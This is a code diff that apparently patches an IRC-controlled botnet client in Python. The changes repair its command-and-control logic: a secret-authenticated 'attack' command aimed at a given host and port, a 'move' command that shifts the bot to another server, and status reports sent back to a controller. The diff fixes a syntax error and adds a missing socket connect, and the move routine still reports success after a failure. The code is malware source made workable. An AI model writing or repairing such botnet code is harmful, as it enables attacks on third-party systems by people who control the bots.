@@ -20,7 +20,7 @@ class Bot:
     CONTROLLER = None
 
 
-    ATTACK_COUNT = 6
+    ATTACK_COUNT = 0
     BOT_COUNT = 0
     NICK_COUNT = 0
 
@@ -133,8 +133,8 @@ class Bot:
             # responde to ping
             elif line[0] == "PING" and not self.PONG:
                 print("DEBUG ping")
-                pong = threading.Thread(target=self.pong, args=line[1])
-                self.PONG = True
+
+                self.send_msg("PONG " + line[1])
 
     def cmds(self, data):
         """ Listen for commands """
@@ -167,7 +167,7 @@ class Bot:
             print(msg)
 
             # attack with bot
-            if msg[0] == "attack" and msg[-1] == self.SECRET and len(msg) == 3:
+            if msg[0] == "attack" and msg[-1] == self.SECRET and len(msg) == 4:
                 host = msg[1]
                 port = msg[2]
 
@@ -176,7 +176,7 @@ class Bot:
                 self.attack(host, port)
 
             # move to another server
-            elif msg[0] == "move" and msg[-1] == self.SECRET and len(msg) == 4:
+            elif msg[0] == "move" and msg[-1] == self.SECRET and len(msg) == 5:
                 host = msg[1]
                 port = msg[2]
                 chan = msg[3]
@@ -260,7 +260,9 @@ class Bot:
 
             # send to controller
             msg = "PRIVMSG " + self.CONTROLLER
-            msg += " :Attack " + host + " " + port + " failed " + self.SECRET
+            msg += " :Attack " + host + " " + str(port) + " failed " + self.SECRET
+            msg += "\n"
+            
             self.send_msg(msg)
 
             return
@@ -275,7 +277,8 @@ class Bot:
 
         # send to controller
         msg = "PRIVMSG " + self.CONTROLLER
-        msg += " :Attack " + host + " " + port + " successful " _ self.SECRET
+        msg += " :Attack " + host + " " + str(port) + " successful " + self.SECRET
+        msg += "\n"
         self.send_msg(msg)
 
         return
@@ -289,10 +292,26 @@ class Bot:
         try:
             # connect
             new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+            new_socket.connect((host, port))
 
         except Exception as e:
-            print("Error: " + str(e)) 
+            print("Error: Move failed " + str(e))     
+
+            # send to controller
+            msg = "PRIVMSG " + self.CONTROLLER
+            msg += " :Move " + host + " " + str(port) + " failed " + self.SECRET
+            msg += "\n"
+            
+            self.send_msg(msg) 
+
+        # success
+
+        # send to controller
+        msg = "PRIVMSG " + self.CONTROLLER
+        msg += " :Move " + host + " " + str(port) + " successful " + self.SECRET
+        msg += "\n"
+        
+        self.send_msg(msg)
 
         return
 
@@ -360,11 +379,13 @@ class Bot:
                 except queue.Empty:
                     if self.SHUTDOWN:
                         sys.exit(0)
+                        
                     continue
 
                 else:
                     # send the msg
                     socket.send(next_msg)
+                    print("DEBUG: MEssage sent")
 
 
 
